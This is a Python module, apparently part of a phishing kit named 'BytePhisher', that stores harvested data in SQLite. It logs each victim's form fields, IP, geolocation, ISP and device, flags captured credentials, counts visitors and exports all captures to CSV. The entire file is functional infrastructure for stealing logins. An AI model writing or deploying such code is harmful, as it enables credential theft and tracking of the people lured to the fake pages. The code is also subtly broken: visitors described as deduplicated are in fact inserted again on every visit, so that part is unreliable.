# BytePhisher — SQLite capture store.
# Tables: captures (every form submission) + visitors (deduped by IP+UA).
import sqlite3
import os
import time
import json
import threading

class CaptureDB:
    def __init__(self, db_path):
        d = os.path.dirname(db_path)
        if d:
            os.makedirs(d, exist_ok=True)
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        # The HTTP server is threaded: serialize writes on one connection.
        self._lock = threading.Lock()
        self.conn.executescript("""
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            source_url TEXT,
            ip TEXT,
            city TEXT,
            country TEXT,
            isp TEXT,
            ua TEXT,
            device TEXT,
            fields_json TEXT,
            is_cred INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            ua TEXT,
            first_seen REAL,
            hits INTEGER DEFAULT 1
        );
        """)
        self.conn.commit()

    def _upsert_visitor(self, ip, ua):
        self.conn.execute(
            "INSERT INTO visitors (ip, ua, first_seen, hits) VALUES (?,?,?,1) "
            "ON CONFLICT DO NOTHING",
            (ip or "unknown", ua or "unknown", time.time()))
        self.conn.execute(
            "UPDATE visitors SET hits = hits + 1 WHERE ip=? AND ua=?",
            (ip or "unknown", ua or "unknown"))

    def log_visit(self, ip, ua):
        """Page view (no credentials) — keeps visitor stats meaningful."""
        with self._lock:
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def record(self, source_url, ip, city, country, isp, ua, device, fields, is_cred):
        with self._lock:
            self.conn.execute(
                "INSERT INTO captures (ts, source_url, ip, city, country, isp, ua, device, fields_json, is_cred) VALUES (?,?,?,?,?,?,?,?,?,?)",
                (time.time(), source_url, ip, city or "", country or "", isp or "",
                 ua, device, json.dumps(fields, default=str), 1 if is_cred else 0))
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def all(self, limit=200):
        rows = self.conn.execute(
            "SELECT ts, source_url, ip, city, country, isp, ua, device, fields_json, is_cred FROM captures ORDER BY id DESC LIMIT ?",
            (limit,)).fetchall()
        return [
            {
                "ts": r[0], "source_url": r[1], "ip": r[2], "city": r[3],
                "country": r[4], "isp": r[5], "ua": r[6], "device": r[7],
                "fields": json.loads(r[8]) if r[8] else {},
                "is_cred": bool(r[9])
            } for r in rows
        ]

    def stats(self):
        total = self.conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
        creds = self.conn.execute("SELECT COUNT(*) FROM captures WHERE is_cred=1").fetchone()[0]
        visitors = self.conn.execute("SELECT COUNT(*) FROM visitors").fetchone()[0]
        return {"total_captures": total, "credentials": creds, "visitors": visitors}

    def export_csv(self, path):
        import csv
        with open(path, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["ts", "source_url", "ip", "city", "country", "isp", "device", "is_cred", "fields"])
            for c in self.all():
                w.writerow([
                    c["ts"], c["source_url"], c["ip"], c["city"], c["country"],
                    c["isp"], c["device"], "YES" if c["is_cred"] else "NO",
                    "; ".join(f"{k}={v}" for k, v in c["fields"].items())
                ])
        return path

    def close(self):
        self.conn.close()
